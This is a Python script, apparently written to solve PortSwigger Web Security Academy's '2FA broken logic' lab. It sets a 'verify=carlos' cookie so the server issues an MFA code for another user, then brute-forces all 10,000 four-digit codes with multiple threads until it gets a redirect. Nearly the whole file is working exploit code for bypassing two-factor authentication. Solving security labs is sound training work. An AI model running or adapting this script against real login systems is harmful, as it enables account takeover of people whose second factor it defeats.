#!/usr/bin/python3

#Coded by: L4med
#Github: https://github.com/L4med
#Description:
    # A basic script to solve 2FA broken logic lab from Web Security Acdemy PortSwigger.


import requests
import threading
import signal
import sys
import time
import webbrowser

# Variable global para indicar si se debe terminar
terminate = False

# Definir la URL base
if len(sys.argv) != 3:
    print("Uso: python3 script.py url num_hilos")
    sys.exit(1)

url = sys.argv[1] + "/login2"
num_hilos = int(sys.argv[2])

# Configurar los headers de la petición
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Cookie": "session=; verify=carlos"
}

# Función para manejar la señal de interrupción (Ctrl + C)
def signal_handler(sig, frame):
    global terminate
    terminate = True
    print("\nTerminando todos los hilos...")

signal.signal(signal.SIGINT, signal_handler)

# Función para realizar las peticiones con el MFA
def realizar_peticion(start, end):
    global terminate
    for i in range(start, end):
        if terminate:
            break
        # Formatear el código MFA con ceros a la izquierda
        mfa_code = f"{i:04}"

        # Definir los datos a enviar
        data = {
            "mfa-code": mfa_code
        }

        # Hacer la petición POST
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)

        # Imprimir el código MFA y el código de estado de la respuesta
        print(f"Intentando MFA code: {mfa_code}, Status Code: {response.status_code}")

        # Verificar si el código de estado es 302
        if response.status_code == 302:
            terminate = True
            print(f"Código MFA encontrado: {mfa_code}")
            break


# BANNER
print("""
  _    _  _                      _ 
 | |  | || |  _ __ ___   ___  __| |
 | |  | || |_| '_ ` _ \ / _ \/ _` |
 | |__|__   _| | | | | |  __/ (_| |
 |_____| |_| |_| |_| |_|\___|\__,_|
                                   
""")


headers0 = {
        "Cookie":"session=; verify=carlos"
}
response0 = requests.get(sys.argv[1] + "/login2", headers=headers0)
print(f"Petición de creación de código MFA, Status Code: {response0.status_code}")

# Crear hilos
hilos = []
peticiones_por_hilo = 10000 // num_hilos

for i in range(num_hilos):
    start = i * peticiones_por_hilo
    end = start + peticiones_por_hilo if i < num_hilos - 1 else 10000
    hilo = threading.Thread(target=realizar_peticion, args=(start, end))
    hilos.append(hilo)
    hilo.start()

# Esperar a que todos los hilos terminen
for hilo in hilos:
    hilo.join()

print("Todos los hilos han terminado.")
